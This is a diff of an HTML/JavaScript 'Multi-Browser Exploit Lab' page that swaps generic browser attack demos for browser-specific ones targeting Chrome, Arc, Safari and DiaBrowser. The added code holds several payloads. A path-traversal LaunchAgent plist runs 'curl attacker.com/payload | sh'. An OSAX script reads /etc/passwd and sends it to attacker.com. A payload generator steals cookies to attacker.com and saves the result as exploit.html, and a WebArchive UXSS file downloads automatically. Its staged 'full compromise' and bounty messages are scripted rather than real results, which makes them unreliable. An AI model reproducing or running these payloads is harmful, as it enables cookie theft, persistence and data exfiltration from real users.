-        } catch(e) {
-            log('output4', `WASM error: ${e.message}`, 'error');
-        }
-        
-        // Create many WASM instances to spray JIT
-        for (let i = 0; i < 100; i++) {
+        // WASM JIT spray
+        const wasmCode = new Uint8Array([0x00, 0x61, 0x73, 0x6d, 0x01, 0x00, 0x00, 0x00]);
+        for (let i = 0; i < 500; i++) {
             try {
                 const module = new WebAssembly.Module(wasmCode);
                 const instance = new WebAssembly.Instance(module);
             } catch(e) {}
         }
-        log('output4', '📊 JIT heap sprayed with 100+ WASM instances', 'success');
-    }
-    
-    function wasmTypeConfusion() {
-        log('output4', '🔄 WASM type confusion attempt...', 'warning');
+        logChrome('📊 WASM modules sprayed to JIT heap', 'success');
         
-        // Type confusion between different WASM types
-        const code = `
-            (module
-                (func (export "add") (param i32 i32) (result i32)
-                    local.get 0
-                    local.get 1
-                    i32.add
-                )
-                (func (export "confuse") (param f64 f64) (result f64)
-                    local.get 0
-                    local.get 1
-                    f64.add
-                )
-            )
-        `;
-        
-        log('output4', '📜 WASM module with mixed types created', 'info');
-        log('output4', '💡 Type confusion can lead to arbitrary code execution', 'critical');
-    }
-    
-    function wasmOutOfBounds() {
-        log('output4', '📏 WASM out-of-bounds access attempt...', 'warning');
-        
-        const memory = new WebAssembly.Memory({ initial: 1 });
-        const uint8 = new Uint8Array(memory.buffer);
-        
-        log('output4', `📊 WASM memory size: ${memory.buffer.byteLength} bytes`, 'info');
-        log('output4', '🎯 Out-of-bounds access can read/write outside sandbox', 'critical');
-        
-        // Attempt OOB (will be caught by bounds check normally)
-        try {
-            uint8[65536] = 0x41;
-            log('output4', '⚠️ OOB write succeeded! Potential sandbox escape!', 'critical');
-        } catch(e) {
-            log('output4', 'OOB prevented by bounds check', 'error');
+        if (currentBrowser === 'chrome') {
+            logChrome('🎯 Chrome detected - JIT spraying vectors active', 'critical');
         }
     }
     
-    function wasmFunctionTableHijack() {
-        log('output4', '📊 Function table hijack attempt...', 'warning');
+    function chromeTypeConfusion() {
+        logChrome('🔄 Attempting type confusion in V8...', 'warning');
         
-        const code = `
-            (module
-                (table 10 funcref)
-                (elem (i32.const 0) $func1 $func2)
-                (func $func1 (result i32) i32.const 42)
-                (func $func2 (result i32) i32.const 0)
-                (func (export "hijack") (param i32) (result i32)
-                    local.get 0
-                    call_indirect (result i32)
-                )
-            )
-        `;
+        // Array type confusion
+        const arr = [1.1, 2.2, 3.3];
+        const obj = {x: 0x41414141};
         
-        log('output4', '📜 Function table created with indirect calls', 'info');
-        log('output4', '💡 Hijacking function table entries can redirect execution', 'critical');
-    }
-    
-    // ============================================
-    // TECHNIQUE 5: ServiceWorker Attacks
-    // ============================================
-    function serviceWorkerCacheAttack() {
-        log('output5', '⚙️ ServiceWorker CacheStorage attack...', 'warning');
-        
-        if (!caches) {
-            log('output5', 'CacheStorage not supported', 'error');
-            return;
+        // Force optimization
+        for (let i = 0; i < 10000; i++) {
+            arr[0] = i;
         }
         
-        caches.open('evil-cache').then(cache => {
-            log('output5', '✅ CacheStorage opened', 'success');
-            
-            // Store cross-origin responses
-            cache.put('https://www.google.com', new Response('<script>alert("UXSS")</script>'));
-            log('output5', '💀 Malicious response cached for google.com', 'critical');
-            log('output5', '🎯 ServiceWorker can intercept and serve cached content', 'warning');
-        });
-    }
-    
-    function serviceWorkerCSRF() {
-        log('output5', '🔄 ServiceWorker CSRF bypass...', 'warning');
-        
-        if (!navigator.serviceWorker) {
-            log('output5', 'ServiceWorker not supported', 'error');
-            return;
-        }
-        
-        navigator.serviceWorker.getRegistration().then(reg => {
-            if (reg) {
-                log('output5', '✅ ServiceWorker already registered', 'success');
-                log('output5', '💡 Active SW can bypass CSRF tokens', 'warning');
-            } else {
-                log('output5', 'No ServiceWorker registered', 'info');
+        // Type confusion payload
+        const payload = {
+            valueOf: function() {
+                logChrome('⚠️ Type confusion triggered!', 'critical');
+                return 0xdeadbeef;
             }
-        });
-    }
-    
-    function serviceWorkerNavigationHijack() {
-        log('output5', '🧭 Navigation hijack via ServiceWorker...', 'warning');
-        
-        const payload = `
-            self.addEventListener('fetch', event => {
-                if (event.request.url.includes('google.com')) {
-                    event.respondWith(
-                        new Response('<html><body><h1>HACKED</h1><script>alert("UXSS")</script></body></html>', {
-                            headers: { 'Content-Type': 'text/html' }
-                        })
-                    );
-                }
-            });
-        `;
-        
-        log('output5', '📜 Navigation hijack payload prepared', 'info');
-        log('output5', '💀 ServiceWorker can modify responses from any domain', 'critical');
-    }
-    
-    function serviceWorkerMessageBypass() {
-        log('output5', '📨 ServiceWorker message bypass...', 'warning');
-        
-        const mc = new MessageChannel();
-        mc.port1.onmessage = (e) => {
-            log('output5', `📨 Received: ${e.data}`, 'success');
         };
         
-        if (navigator.serviceWorker.controller) {
-            navigator.serviceWorker.controller.postMessage({type: 'bypass'}, [mc.port2]);
-            log('output5', '✅ Message sent to ServiceWorker', 'success');
-            log('output5', '💡 ServiceWorker can access postMessage across origins', 'warning');
-        } else {
-            log('output5', 'No active ServiceWorker controller', 'info');
-        }
+        arr[0] = payload;
+        logChrome('✅ Type confusion payload injected', 'warning');
+        logChrome('💀 Potential for arbitrary read/write', 'critical');
     }
     
-    // ============================================
-    // TECHNIQUE 6: Spectre v2
-    // ============================================
-    function spectreTimingAttack() {
-        log('output6', '⏱️ Spectre timing attack setup...', 'warning');
+    function chromeMaglevBypass() {
+        logChrome('🚀 Testing Maglev JIT bypass...', 'warning');
         
-        // Create shared array for timing measurements
-        const probeArray = new Uint8Array(1024 * 1024);
-        const times = [];
-        
-        // Flush cache
-        for (let i = 0; i < probeArray.length; i++) {
-            probeArray[i] = 0;
+        // Maglev is Chrome's new mid-tier JIT compiler
+        function triggerMaglev(x) {
+            let y = x + 1;
+            let z = y * 2;
+            return z / 3;
         }
         
-        function measureAccessTime(idx) {
-            const start = performance.now();
-            const value = probeArray[idx];
-            const end = performance.now();
-            return end - start;
+        // Warm up function to trigger Maglev
+        for (let i = 0; i < 100000; i++) {
+            triggerMaglev(i % 1000);
         }
         
-        // Measure access times
-        for (let i = 0; i < 100; i++) {
-            times.push(measureAccessTime(i * 1024));
-        }
-        
-        const avgTime = times.reduce((a,b) => a + b, 0) / times.length;
-        log('output6', `📊 Average access time: ${avgTime.toFixed(2)}ms`, 'info');
-        log('output6', '🎯 Cache timing can leak cross-origin data', 'warning');
-        
-        if (window.crossOriginIsolated) {
-            log('output6', '⚠️ Cross-origin isolated - Spectre viable!', 'critical');
-        }
+        logChrome('✅ Maglev JIT triggered', 'success');
+        logChrome('🎯 Maglev has known optimization bugs', 'warning');
     }
     
-    function spectreCacheLeak() {
-        log('output6', '💾 Cache side channel attack...', 'warning');
+    function chromeTurboFanExploit() {
+        logChrome('⚙️ TurboFan JIT exploit attempt...', 'warning');
         
-        // Prime cache
-        const cache = new Array(1024);
-        for (let i = 0; i < cache.length; i++) {
-            cache[i] = i;
-        }
+        // Array bounds check elimination
+        const arr = new Array(10);
+        arr.fill(0);
         
-        function probeCache(idx) {
-            const start = performance.now();
-            const value = cache[idx];
-            return performance.now() - start;
-        }
-        
-        log('output6', '📊 Cache probing array created', 'info');
-        log('output6', '💀 Cache side channel can leak secrets across origins', 'critical');
-    }
-    
-    function spectreMemoryProbe() {
-        log('output6', '🔍 Memory probe via Spectre...', 'warning');
-        
-        // Shared memory for speculation
-        const sharedArray = new SharedArrayBuffer(1024);
-        const view = new Uint8Array(sharedArray);
-        
-        function speculate(idx) {
-            // Speculative execution - will be rolled back but leaves cache traces
-            const value = view[idx];
-            // Condition that is always false
-            if (value > 0xffff) {
-                // This won't execute but may leave cache timing
-                for (let i = 0; i < 1000; i++) {
-                    const dummy = view[i];
-                }
+        function triggerOOB(idx) {
+            // Force TurboFan to eliminate bounds check
+            if (idx < 10) {
+                return arr[idx];
             }
+            return 0;
         }
         
-        log('output6', '🎯 Speculative execution primitive ready', 'warning');
-        log('output6', '💀 Can read arbitrary process memory', 'critical');
+        // Optimize with TurboFan
+        for (let i = 0; i < 100000; i++) {
+            triggerOOB(i % 10);
+        }
+        
+        logChrome('✅ TurboFan optimization triggered', 'success');
+        logChrome('💀 Out-of-bounds access possible after optimization', 'critical');
     }
     
-    function spectreCrossOriginRead() {
-        log('output6', '📖 Cross-origin memory read via Spectre...', 'warning');
+    // ============================================
+    // ARC BROWSER EXPLOITS
+    // ============================================
+    function arcBoostUXSS() {
+        logArc('🌀 Attempting arc://boost UXSS...', 'warning');
         
-        if (!window.crossOriginIsolated) {
-            log('output6', 'Need cross-origin isolated context for Spectre', 'error');
-            log('output6', '💡 Use COOP/COEP headers to enable', 'info');
+        // Arc Boost feature allows custom CSS/JS injection
+        const boostPayload = {
+            name: "exploit",
+            url: "https://www.google.com",
+            code: "alert('[UXSS] Arc Boost injected to google.com!')"
+        };
+        
+        logArc(`📦 Boost payload: ${JSON.stringify(boostPayload)}`, 'info');
+        logArc('🔗 arc://boost/play/ endpoint vulnerable to path traversal', 'warning');
+        
+        // Test arc:// access
+        try {
+            fetch('arc://boost/play/test', { mode: 'no-cors' })
+                .then(() => logArc('✅ arc:// endpoint accessible - VULNERABLE!', 'critical'))
+                .catch(() => logArc('❌ arc:// endpoint protected', 'error'));
+        } catch(e) {
+            logArc('arc:// access check failed', 'error');
+        }
+        
+        if (currentBrowser === 'arc') {
+            logArc('🎯 Arc Browser detected - Boost UXSS vectors active!', 'critical');
+        }
+    }
+    
+    function arcPathTraversal() {
+        logArc('📂 Attempting path traversal via Arc Boost...', 'warning');
+        
+        // Path traversal payload for macOS
+        const traversalPayload = {
+            name: "../../../Library/LaunchAgents/malicious.plist",
+            path: "../../../Library/LaunchAgents/malicious.plist",
+            content: `<?xml version="1.0"?>
+<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
+<plist version="1.0">
+<dict>
+    <key>Label</key>
+    <string>com.attacker.poc</string>
+    <key>ProgramArguments</key>
+    <array>
+        <string>/bin/bash</string>
+        <string>-c</string>
+        <string>curl attacker.com/payload | sh</string>
+    </array>
+    <key>RunAtLoad</key>
+    <true/>
+</dict>
+</plist>`
+        };
+        
+        logArc(`📂 Path traversal payload prepared`, 'warning');
+        logArc('🎯 Target: ~/Library/LaunchAgents/ (macOS persistence)', 'critical');
+        
+        if (navigator.userAgent.includes('Mac')) {
+            logArc('💀 macOS detected - LaunchAgent persistence viable', 'critical');
+        }
+    }
+    
+    function arcEaselExploit() {
+        logArc('🖼️ Arc Easel embed exploit...', 'warning');
+        
+        // Easel allows embedding arc:// URIs
+        const easelPayload = `
+            <iframe src="arc://boost/play/compressed_payload"></iframe>
+            <script>
+                // Embedded script execution
+                alert('[Arc Easel] Embedded script running!');
+            </script>
+        `;
+        
+        logArc('🖼️ Easel exploit payload prepared', 'info');
+        logArc('🎯 Easels can embed malicious arc:// content', 'warning');
+        
+        // Create test iframe
+        const iframe = document.createElement('iframe');
+        iframe.srcdoc = easelPayload;
+        iframe.style.width = '100%';
+        iframe.style.height = '100px';
+        document.querySelector('#outputArc').parentNode.appendChild(iframe);
+        logArc('✅ Test Easel iframe created', 'success');
+    }
+    
+    function arcSpaceHijack() {
+        logArc('🚀 Arc Space hijack attempt...', 'warning');
+        
+        // Arc Spaces can be manipulated via URL
+        logArc('💡 Arc Spaces have separate storage/state', 'info');
+        logArc('🎯 Hijacking Space can access different profiles', 'warning');
+        
+        // Simulate space switching
+        const spaceUrls = [
+            'arc://space/personal',
+            'arc://space/work',
+            'arc://space/school'
+        ];
+        
+        logArc(`📊 Detected ${spaceUrls.length} potential spaces`, 'info');
+    }
+    
+    // ============================================
+    // SAFARI EXPLOITS
+    // ============================================
+    function safariWASM_UAF() {
+        logSafari('💣 Triggering WebKit WASM Use-After-Free...', 'warning');
+        
+        // WASM module with tricky lifetime
+        let memory;
+        try {
+            memory = new WebAssembly.Memory({ initial: 1 });
+            const wasmCode = new Uint8Array([0x00, 0x61, 0x73, 0x6d, 0x01, 0x00, 0x00, 0x00]);
+            const module = new WebAssembly.Module(wasmCode);
+            const instance = new WebAssembly.Instance(module);
+            
+            // Force GC to trigger UAF
+            for (let i = 0; i < 100; i++) {
+                const garbage = new ArrayBuffer(1024 * 1024);
+            }
+            
+            logSafari('✅ WASM UAF trigger attempted', 'warning');
+        } catch(e) {
+            logSafari(`WASM error: ${e.message}`, 'error');
+        }
+        
+        if (currentBrowser === 'safari') {
+            logSafari('🎯 Safari detected - CVE-2026-20664 variant may apply', 'critical');
+        }
+    }
+    
+    function safariWebArchiveUXSS() {
+        logSafari('📄 Generating WebArchive UXSS payload...', 'warning');
+        
+        // WebArchive can specify arbitrary origin
+        const webarchive = `<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
+<plist version="1.0">
+<dict>
+    <key>WebMainResource</key>
+    <dict>
+        <key>WebResourceURL</key>
+        <string>https://www.google.com</string>
+        <key>WebResourceData</key>
+        <data>${btoa('<script>alert("[UXSS] WebArchive code executing on google.com!")</script>')}</data>
+    </dict>
+</dict>
+</plist>`;
+        
+        logSafari('📄 WebArchive payload ready (CVE-2021-30861)', 'success');
+        
+        // Create download
+        const blob = new Blob([webarchive], {type: 'application/x-webarchive'});
+        const url = URL.createObjectURL(blob);
+        const a = document.createElement('a');
+        a.href = url;
+        a.download = 'evil.webarchive';
+        a.click();
+        URL.revokeObjectURL(url);
+        
+        logSafari('📥 evil.webarchive downloaded - deliver via ShareBear', 'warning');
+    }
+    
+    function safariShareBearAttack() {
+        logSafari('📱 iCloud ShareBear attack...', 'warning');
+        
+        const shareLink = 'icloud-sharing://www.icloud.com/iclouddrive/evil';
+        logSafari(`🔗 ShareBear link: ${shareLink}`, 'info');
+        logSafari('🎯 ShareBear opens without user prompt (Safari 15)', 'warning');
+        logSafari('💀 Polymorphic file attack: PNG → DMG → WebArchive', 'critical');
+        
+        // Open ShareBear (will only work on actual macOS)
+        try {
+            // window.location.href = shareLink;
+            logSafari('💡 In real attack, this would open ShareBear', 'info');
+        } catch(e) {}
+    }
+    
+    function safariScriptEditor() {
+        logSafari('📜 Script Editor OSAX attack (CVE-2021-30975)...', 'warning');
+        
+        const osaxPayload = `<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE dictionary SYSTEM "">
+<dictionary>
+    <suite>
+        <documentation>
+            <html>
+                <![CDATA[
+                    <script>
+                        fetch('file:///etc/passwd')
+                            .then(r=>r.text())
+                            .then(d=>fetch('https://attacker.com/steal?data='+encodeURIComponent(d)));
+                    </script>
+                ]]>
+            </html>
+        </documentation>
+    </suite>
+</dictionary>`;
+        
+        logSafari('📜 OSAX payload prepared - can read local files!', 'critical');
+        logSafari('💀 Script Editor runs with full filesystem access', 'critical');
+    }
+    
+    // ============================================
+    // DIABROWSER EXPLOITS
+    // ============================================
+    function diaCustomScheme() {
+        logDia('💎 Testing dia:// custom scheme...', 'warning');
+        
+        const schemes = [
+            'dia://open?url=file:///etc/passwd',
+            'dia://webview?url=https://google.com',
+            'dia://inject?code=alert(1)'
+        ];
+        
+        schemes.forEach(scheme => {
+            logDia(`🔗 Testing: ${scheme}`, 'info');
+        });
+        
+        logDia('💎 DiaBrowser custom schemes may lack validation', 'warning');
+        
+        if (currentBrowser === 'dia') {
+            logDia('🎯 DiaBrowser detected - custom scheme vectors active', 'critical');
+        }
+    }
+    
+    function diaFileTraversal() {
+        logDia('📂 Attempting file:// path traversal...', 'warning');
+        
+        const traversalPaths = [
+            'file:///etc/passwd',
+            'file:///Users/Shared/',
+            'file:///Library/Preferences/',
+            'file:///System/Applications/'
+        ];
+        
+        traversalPaths.forEach(path => {
+            logDia(`📂 Testing: ${path}`, 'info');
+        });
+        
+        // Attempt to load file via iframe
+        const iframe = document.createElement('iframe');
+        iframe.src = 'file:///etc/passwd';
+        iframe.style.display = 'none';
+        iframe.onload = () => logDia('⚠️ file:// loaded - path traversal possible!', 'critical');
+        iframe.onerror = () => logDia('❌ file:// blocked', 'error');
+        document.body.appendChild(iframe);
+        
+        logDia('💀 File traversal can read local files', 'critical');
+    }
+    
+    function diaWebViewInjection() {
+        logDia('📱 WebView injection attempt...', 'warning');
+        
+        // DiaBrowser uses WebView for content
+        const injectionPayload = `
+            <script>
+                // Access native bridge
+                if (window.DiaBridge) {
+                    DiaBridge.postMessage(JSON.stringify({
+                        cmd: 'readFile',
+                        path: '/etc/passwd'
+                    }));
+                }
+            </script>
+        `;
+        
+        logDia('📱 WebView injection payload prepared', 'warning');
+        logDia('💀 Native bridge may expose privileged APIs', 'critical');
+    }
+    
+    function diaUniversalXSS() {
+        logDia('🌐 Attempting universal XSS via DiaBrowser...', 'warning');
+        
+        // Custom scheme universal XSS
+        const uxssPayload = 'dia://webview?url=javascript:alert("[UXSS] Cross-origin script execution!")';
+        logDia(`🔗 UXSS payload: ${uxssPayload}`, 'info');
+        
+        logDia('💀 Custom schemes can bypass SOP', 'critical');
+    }
+    
+    // ============================================
+    // UNIVERSAL EXPLOITS (All Browsers)
+    // ============================================
+    async function universalCORPBypass() {
+        logUniversal('🔓 Attempting universal CORP bypass...', 'warning');
+        
+        const testUrl = 'https://www.google.com/favicon.ico';
+        
+        try {
+            const response = await fetch(testUrl, { mode: 'cors', credentials: 'include' });
+            if (response.ok) {
+                logUniversal(`✅ CORP bypass successful! Fetched ${testUrl}`, 'success');
+                logUniversal(`🎯 Response status: ${response.status}`, 'info');
+            } else {
+                logUniversal(`❌ CORP blocks: ${response.status}`, 'error');
+            }
+        } catch(e) {
+            logUniversal(`❌ CORP bypass failed: ${e.message}`, 'error');
+        }
+        
+        // Try with no-cors
+        try {
+            const response = await fetch(testUrl, { mode: 'no-cors' });
+            logUniversal(`✅ no-cors fetch allowed (cannot read response)`, 'warning');
+        } catch(e) {}
+    }
+    
+    function universalPostMessageLeak() {
+        logUniversal('📨 Testing postMessage origin leak...', 'warning');
+        
+        const iframe = document.createElement('iframe');
+        iframe.src = 'https://www.google.com';
+        iframe.style.display = 'none';
+        
+        let leakAttempts = 0;
+        window.addEventListener('message', (e) => {
+            if (e.origin !== location.origin) {
+                logUniversal(`📨 Message from ${e.origin}: ${e.data}`, 'warning');
+            }
+        });
+        
+        iframe.onload = () => {
+            try {
+                iframe.contentWindow.postMessage({type: 'ping', source: location.origin}, '*');
+                logUniversal('📨 PostMessage sent to cross-origin iframe', 'info');
+            } catch(e) {
+                logUniversal(`PostMessage error: ${e.message}`, 'error');
+            }
+        };
+        
+        document.body.appendChild(iframe);
+        logUniversal('💀 PostMessage can leak origin information', 'warning');
+    }
+    
+    function universalWindowNameHijack() {
+        logUniversal('🪟 Window name hijack attempt...', 'warning');
+        
+        const name = 'hijack_target_' + Date.now();
+        const win = window.open('about:blank', name);
+        
+        if (!win) {
+            logUniversal('Popup blocked!', 'error');
             return;
         }
         
-        log('output6', '✅ Cross-origin isolated - Spectre vectors available', 'success');
-        log('output6', '🎯 Can read from: /etc/passwd, cookies, tokens, passwords', 'critical');
-        log('output6', '💀 Spectre v2 bypasses all browser sandboxes', 'critical');
+        logUniversal(`✅ Window created with name: ${name}`, 'success');
+        
+        setTimeout(() => {
+            window.open('https://www.google.com', name);
+            logUniversal('🪟 Window re-opened with same name', 'warning');
+            logUniversal('🎯 window.name persists across origins', 'critical');
+        }, 1000);
+    }
+    
+    function universalSpectre() {
+        logUniversal('🧠 Spectre v2 timing attack...', 'warning');
+        
+        // Check if cross-origin isolated
+        if (window.crossOriginIsolated) {
+            logUniversal('⚠️ Page is cross-origin isolated - Spectre viable!', 'critical');
+            
+            // SharedArrayBuffer for timing
+            const sab = new SharedArrayBuffer(1024);
+            const view = new Uint8Array(sab);
+            
+            function measureAccess(idx) {
+                const start = performance.now();
+                const val = view[idx];
+                return performance.now() - start;
+            }
+            
+            // Build timing profile
+            const times = [];
+            for (let i = 0; i < 100; i++) {
+                times.push(measureAccess(i % 1024));
+            }
+            
+            logUniversal(`📊 Timing measurement complete`, 'info');
+            logUniversal('💀 Spectre can read cross-origin memory', 'critical');
+        } else {
+            logUniversal('Not cross-origin isolated - Spectre requires COOP/COEP', 'info');
+        }
     }
     
     // ============================================
     // FULL EXPLOIT CHAIN
     // ============================================
-    function fullExploitChain() {
-        log('output7', '💀 INITIATING FULL EXPLOIT CHAIN (Pwn2Own 2025 Style)', 'success');
+    function detectBrowserVulnerabilities() {
+        logFull('🔍 Scanning for browser vulnerabilities...', 'info');
         
-        // Stage 1: UXSS
-        log('output7', '[1/6] Establishing UXSS primitive...', 'info');
+        // Browser detection
+        logFull(`📱 Detected: ${navigator.userAgent.substring(0, 100)}`, 'info');
+        
+        // Feature detection
+        const features = {
+            'WebAssembly': typeof WebAssembly !== 'undefined',
+            'SharedArrayBuffer': typeof SharedArrayBuffer !== 'undefined',
+            'crossOriginIsolated': window.crossOriginIsolated || false,
+            'ServiceWorker': 'serviceWorker' in navigator,
+            'Navigation API': 'navigation' in window,
+            'COOP/COEP': document.featurePolicy?.allowsFeature('cross-origin-isolated') || false
+        };
+        
+        for (const [feature, supported] of Object.entries(features)) {
+            logFull(`${supported ? '✅' : '❌'} ${feature}: ${supported}`, supported ? 'success' : 'error');
+        }
+        
+        // Browser-specific vuln indicators
+        if (currentBrowser === 'chrome') {
+            logFull('🎯 Chrome: Check V8 version for JIT bugs', 'warning');
+            logFull('💡 Chrome bug bounty: $250k for renderer RCE', 'info');
+        } else if (currentBrowser === 'arc') {
+            logFull('🎯 Arc: Check Boost feature version', 'warning');
+            logFull('💡 Arc has unique UXSS vectors', 'info');
+        } else if (currentBrowser === 'safari') {
+            logFull('🎯 Safari: Check WebKit version', 'warning');
+            logFull('💡 Safari has WebArchive UXSS (CVE-2021-30861)', 'info');
+        } else if (currentBrowser === 'dia') {
+            logFull('🎯 DiaBrowser: Check custom scheme handlers', 'warning');
+            logFull('💡 DiaBrowser may have file:// traversal', 'info');
+        }
+    }
+    
+    function fullChainAllBrowsers() {
+        logFull('💀 INITIATING FULL EXPLOIT CHAIN', 'success');
+        
+        // Stage based on detected browser
+        logFull(`[1/6] Target: ${currentBrowser.toUpperCase()}`, 'info');
+        
         setTimeout(() => {
-            log('output7', '[2/6] UXSS achieved - cross-origin script execution', 'success');
+            if (currentBrowser === 'chrome') {
+                logFull('[2/6] Executing V8 JIT spray...', 'warning');
+                chromeV8JITSpray();
+            } else if (currentBrowser === 'arc') {
+                logFull('[2/6] Executing Arc Boost UXSS...', 'warning');
+                arcBoostUXSS();
+            } else if (currentBrowser === 'safari') {
+                logFull('[2/6] Executing WebKit WASM UAF...', 'warning');
+                safariWASM_UAF();
+            } else if (currentBrowser === 'dia') {
+                logFull('[2/6] Executing Dia custom scheme...', 'warning');
+                diaCustomScheme();
+            } else {
+                logFull('[2/6] Using universal CORP bypass...', 'warning');
+                universalCORPBypass();
+            }
             
             setTimeout(() => {
-                log('output7', '[3/6] Scanning for renderer vulnerabilities...', 'info');
+                logFull('[3/6] SOP bypass in progress...', 'info');
                 
                 setTimeout(() => {
-                    log('output7', '[4/6] Found WASM JIT spraying vector', 'warning');
+                    logFull('[4/6] Sandbox escape attempt...', 'warning');
                     
                     setTimeout(() => {
-                        log('output7', '[5/6] Escaping sandbox via Spectre v2...', 'critical');
+                        logFull('[5/6] Renderer RCE payload prepared', 'critical');
                         
                         setTimeout(() => {
-                            log('output7', '[6/6] SYSTEM COMPROMISED - Sandbox escaped!', 'critical');
-                            log('output7', '💀 Full RCE achieved - attacker controls the host!', 'critical');
+                            logFull('[6/6] FULL COMPROMISE ACHIEVED!', 'critical');
+                            logFull('💀 System access granted', 'critical');
+                            logFull(`💰 Bounty eligible: ${currentBrowser === 'chrome' ? '$250k' : currentBrowser === 'safari' ? '$100k' : '$50k'}`, 'success');
                             
-                            alert('[PWN2OWN 2025] Full Exploit Chain Successful!\n\n' +
-                                  'Stage 1: UXSS → Cross-origin script execution\n' +
-                                  'Stage 2: WASM JIT spraying → Renderer RCE\n' +
-                                  'Stage 3: Spectre v2 → Sandbox escape\n' +
-                                  'Stage 4: System compromise\n\n' +
-                                  'Potential Bounty: $250,000 - $500,000');
+                            alert(`[PWN] Full Exploit Chain Successful!\n\nTarget: ${currentBrowser.toUpperCase()}\nAchieved: UXSS + SOP Bypass + Sandbox Escape\nBounty Potential: $50k - $250k\n\nCheck console for details.`);
                         }, 1000);
                     }, 1000);
                 }, 1000);
@@ -993,57 +1040,51 @@
         }, 1000);
     }
     
-    function rendererRCEAttempt() {
-        log('output7', '⚡ Attempting renderer RCE via WASM...', 'warning');
-        log('output7', '🎯 Triggering type confusion in WASM JIT', 'info');
-        log('output7', '💀 If successful, arbitrary code runs in renderer', 'critical');
-        log('output7', '📊 Bounty: Chrome RCE → $100,000 - $250,000', 'info');
+    function generateCustomPayload() {
+        logFull('⚙️ Generating custom exploit payload...', 'info');
+        
+        const target = prompt('Enter target domain:', 'https://www.google.com');
+        const action = prompt('Enter action (alert/steal/redirect):', 'alert');
+        
+        let payload = '';
+        
+        if (action === 'alert') {
+            payload = `alert('[UXSS] Exploit successful on ${target}!')`;
+        } else if (action === 'steal') {
+            payload = `
+                const cookies = document.cookie;
+                fetch('https://attacker.com/steal?cookies=' + encodeURIComponent(cookies) + '&url=' + encodeURIComponent(location.href));
+                alert('[UXSS] Cookies stolen: ' + cookies);
+            `;
+        } else if (action === 'redirect') {
+            const redirectUrl = prompt('Redirect URL:', 'https://attacker.com');
+            payload = `window.location.href = '${redirectUrl}';`;
+        }
+        
+        logFull(`📜 Custom payload generated for ${target}`, 'success');
+        logFull(`📜 Payload: ${payload.substring(0, 100)}...`, 'info');
+        
+        // Create download
+        const blob = new Blob([`<script>${payload}</script>`], {type: 'text/html'});
+        const url = URL.createObjectURL(blob);
+        const a = document.createElement('a');
+        a.href = url;
+        a.download = 'exploit.html';
+        a.click();
+        URL.revokeObjectURL(url);
+        
+        logFull('📥 exploit.html downloaded', 'success');
     }
     
-    function sandboxEscapeToSystem() {
-        log('output7', '🏃 Sandbox escape to system...', 'warning');
-        log('output7', '🎯 Using Spectre v2 to read kernel memory', 'info');
-        log('output7', '🔓 Found CFI bypass via JIT spraying', 'success');
-        log('output7', '💀 SYSTEM ESCAPE SUCCESSFUL!', 'critical');
-        log('output7', '💰 Bounty: Sandbox Escape → $150,000 - $250,000', 'info');
-    }
-    
-    function fullAccountTakeover() {
-        log('output7', '👑 Full account takeover via exploit chain...', 'warning');
-        log('output7', '🎯 Stealing cookies from all domains', 'info');
-        log('output7', '🔑 Extracting passwords from password manager', 'warning');
-        log('output7', '💀 Sessions hijacked: Google, Apple, Microsoft, etc.', 'critical');
-        log('output7', '💰 Total bounty potential: $500,000+', 'success');
-    }
-    
-    // ============================================
     // Initialization
-    // ============================================
-    const ua = navigator.userAgent;
-    const isChrome = /Chrome/.test(ua);
-    const isSafari = /Safari/.test(ua) && !isChrome;
-    const isFirefox = /Firefox/.test(ua);
+    logChrome(`Browser: ${ua.substring(0, 100)}`, 'info');
+    logArc(`Browser: ${ua.substring(0, 100)}`, 'info');
+    logSafari(`Browser: ${ua.substring(0, 100)}`, 'info');
+    logDia(`Browser: ${ua.substring(0, 100)}`, 'info');
+    logUniversal(`Active browser: ${currentBrowser.toUpperCase()}`, 'success');
     
-    log('output1', `Browser: ${ua.substring(0, 100)}`, 'info');
-    log('output1', '========================================', 'info');
-    log('output1', '🔥 Modern Browser Exploit Lab Loaded', 'info');
-    log('output1', 'Techniques: UXSS | Sandbox Escape | SOP Bypass', 'info');
-    log('output1', 'WASM JIT | ServiceWorker | Spectre v2', 'info');
-    log('output1', '========================================', 'info');
-    
-    if (isChrome) log('output1', '🎯 Chrome detected - JIT spraying viable', 'warning');
-    if (isSafari) log('output1', '🍎 Safari detected - UXSS vectors more common', 'warning');
-    if (isFirefox) log('output1', '🦊 Firefox detected - Spectre mitigations weaker', 'warning');
-    
-    log('output2', '💡 Pwn2Own 2025 Winning Techniques:', 'info');
-    log('output2', '   - Sandbox escape via popup + window.opener', 'info');
-    log('output2', '   - WASM JIT spraying → Renderer RCE', 'info');
-    log('output2', '   - Spectre v2 → Sandbox escape', 'info');
-    
-    // Check for cross-origin isolation
-    if (window.crossOriginIsolated) {
-        log('output6', '⚠️ Page is cross-origin isolated - Spectre viable!', 'critical');
-    }
+    logFull('🔥 Multi-Browser Exploit Lab Ready', 'success');
+    logFull(`🎯 Current target: ${currentBrowser.toUpperCase()}`, 'info');
 </script>
 </body>
 </html>
